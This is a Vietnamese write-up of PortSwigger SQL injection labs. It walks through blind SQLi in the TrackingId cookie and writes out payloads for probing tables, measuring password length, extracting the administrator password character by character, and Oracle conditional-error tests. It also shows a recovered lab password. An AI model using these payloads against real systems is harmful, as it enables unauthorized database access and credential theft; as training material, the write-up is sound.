# [Lab 11: Blind SQLi with conditional responses]()
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/37ad9743-6580-48f3-ba12-fea8f2e1e44d)

trang web chính
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/987b0575-42d5-492b-9bec-0254487eb039)

message `Welcome back!`
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/7e2fd235-25a3-43b0-998e-69a773e82377)

thêm `'`
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/2e7dddc5-0bbb-4a19-8977-c229b04a383c)

message `Welcome back!` biến mất
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/6778550f-7e9e-48e3-b7fd-c57c80804c66)

thêm `--`
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/4b71cdc2-415e-431a-a748-130d904f7dd8)

message đã trở lại --> SQLi ở trackingId
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/7b78da5b-74c8-456d-a6e8-1b24833f1398)

`ORDER BY 1`
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/b460477b-719b-4ee0-9a11-f99a2ab72931)

`' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--`
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/4c560ca7-32ba-4f6d-aa36-14f8406c46d6)
chỉ hiện message Welcome back! câu truy vấn chính xác nhưng không có kết quả trả về mà chỉ có hiện message hay không --> True: hiện message, False: không hiện message

`AND 1=0` --> không hiện message
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/60af5c3f-d3f5-4217-93df-5528bde1aa04)

`AND 1=1` --> hiện message
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/4cc60215-e352-442c-9818-c7b333999958)

--> ta sẽ đưa các điều kiện để khai thác dữ liệu

message xuất hiện --> có username là administrator từ bảng users
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/521b7439-d994-4bbd-8d46-d4ea1816e81c)

`' AND (SELECT LENGTH(password)=§1§ FROM users WHERE username='administrator')--`
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/faeb5c5e-80dd-4563-a5a6-c788035cf6c7)

password có 20 ký tự
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/e0ffd916-4cbe-4da9-9547-61f6984b0a60)

tìm từng ký tự thôi

`' AND (SELECT SUBSTR(password,§1§,1)='§a§' FROM users WHERE username='administrator')--`

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/b11970b0-5185-4ae9-8942-be9c87d391a8)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/ca1a5338-7740-4259-a7f1-80c0f13c77e9)

login and solve the lab
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/a3a65d89-e1aa-4416-8a6b-105aa9245a56)

# [Lab 12: Blind SQLi with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/2736db9b-e388-4209-9b5a-a4dc410315e7)

Đây là trang web chính của bài lab, ta dễ thấy có các chức năng
- Filter: lọc các kết quả của tìm kiếm search
- View details: xem chi tiết sản phẩm
- My account: login và profile của account đăng nhập

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/84eab554-6793-4824-9bf1-2e0ddf976371)

Khi test các chức năng, ta không phát hiện ra lỗi SQLi, tuy nhiên khi thử ở biến TrackingId ở cookie thì ta phát hiện lỗi SQLi
- Khi ta thêm ký tự `'` thì đã thấy xuất hiện lỗi không thể duyệt web

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/88d76f57-aefd-4352-86a1-4ffe77f79458)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/02a0a29c-d280-4252-9040-3302e01ea51d)

Tuy nhiên khi thêm `'` thì lại duyệt web bình thường
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/8d7fa086-cf4c-416a-93e7-8f38dbd407b9)

Tiếp theo cần xác định xem
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/dc845b96-4ef0-4598-b9f6-27746c14769c)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/7c39b315-5945-4e7d-b7ea-fc08112bd9b7)
→ duyệt web bình thường → Database: Oracle
→ sử dụng payload: CASE WHEN → sau khi test → payload thỏa mãn là: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/e20992d2-0dcb-4ad0-943c-db746e8ab101)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/7145bb9a-dae6-4daa-9fe3-b8f1b05c18de)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/e526b059-fd16-43d0-8cd5-cb40b4690133)
duyệt web bình thường
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/486a0144-7108-46aa-8588-788667f3fd57)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/021bb699-4f42-4b90-96ef-bb587b27cf2a)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/b80569b9-42dd-4c6b-8e2a-65de10918afc)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/8c98a14a-ce3e-4b78-9fe6-d042467d4dfc)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/1a163de3-7e68-4395-acc0-df49b29f068c)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/f9e40d0a-f174-4fe8-ae34-69261746fba6)
→ pass 20 ký tự
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/994ab2c3-7fff-48b5-ae35-e89e1d071341)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/1e79cc37-be96-40b5-8be0-ae80344233b7)

→ password là 76xkww0jnumpa206hw9b

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/ce347165-3963-44c2-b6b6-123bec6d2533)

# [Lab 13: Visible error-based SQLi]()


# [Lab 14: Blind SQLi with time delays]()


# [Lab 15: Blind SQLi with time delays and information retrieval]()


# [Lab 18: SQLi with filter bypass via XML encoding]()
